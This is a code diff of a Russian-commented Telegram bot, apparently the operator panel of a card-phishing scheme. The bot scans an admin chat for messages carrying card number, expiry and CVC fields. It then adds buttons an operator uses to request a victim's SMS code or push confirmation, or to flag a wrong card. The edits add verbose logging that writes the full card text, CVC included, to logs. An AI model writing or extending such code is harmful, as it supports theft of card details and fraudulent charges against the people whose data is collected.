@@ -132,7 +132,7 @@ def get_admin_buttons(application_id):
 
 # Инлайн кнопки для платежей - ТОЛЬКО В ЧАТЕ
 def get_payment_buttons(payment_id):
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+    return InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms_code_{payment_id}"),
             InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push_{payment_id}")
@@ -141,8 +141,6 @@ def get_payment_buttons(payment_id):
             InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card_{payment_id}")
         ]
     ])
-    logging.info(f"Созданы кнопки для платежа #{payment_id}")
-    return keyboard
 
 
 # Инлайн кнопка профиля - ТОЛЬКО В БОТЕ
@@ -637,22 +635,28 @@ async def reject_application(callback: types.CallbackQuery):
     await callback.answer()
 
 
-# Обработчик сообщений в чате - ТОЛЬКО ПЛАТЕЖНЫЕ ДАННЫЕ
+# Обработчик ВСЕХ сообщений в чате
 @dp.message(F.chat.id == ADMIN_CHAT_ID)
 async def handle_chat_messages(message: types.Message):
-    """Обрабатывает сообщения только в админском чате"""
+    """Обрабатывает ВСЕ сообщения в админском чате"""
     message_text = message.text or ""
     
-    logging.info(f"Сообщение в чате от {message.from_user.id}: {message_text[:100]}...")
+    logging.info(f"=== СООБЩЕНИЕ В ЧАТЕ ===")
+    logging.info(f"От: {message.from_user.id} ({message.from_user.username})")
+    logging.info(f"Текст: {message_text}")
+    logging.info(f"Чат ID: {message.chat.id}")
 
-    # Игнорируем команды
-    if message_text.startswith('/'):
+    # Игнорируем команды и сообщения от самого бота
+    if message_text.startswith('/') or message.from_user.is_bot:
+        logging.info("Игнорируем команду или сообщение от бота")
         return
 
     # Проверяем, это платежные данные
     if any(keyword in message_text for keyword in ["НОВАЯ ОПЛАТА", "Клиент:", "Карта:", "Номер:", "Срок:", "CVC:"]):
-        logging.info("Обнаружены платежные данные в чате!")
+        logging.info("✅ ОБНАРУЖЕНЫ ПЛАТЕЖНЫЕ ДАННЫЕ!")
         await process_payment_data(message)
+    else:
+        logging.info("❌ Это не платежные данные")
 
 
 # Функция обработки платежных данных - ТОЛЬКО В ЧАТЕ
@@ -739,7 +743,6 @@ async def process_payment_data(message: types.Message):
             )
             logging.info(f"✅ Уведомление с кнопками отправлено в чат для платежа #{payment_id}")
             logging.info(f"Message ID: {sent_message.message_id}")
-            logging.info(f"Кнопки: {get_payment_buttons(payment_id)}")
         except Exception as e:
             logging.error(f"Ошибка отправки сообщения в чат: {e}")
 
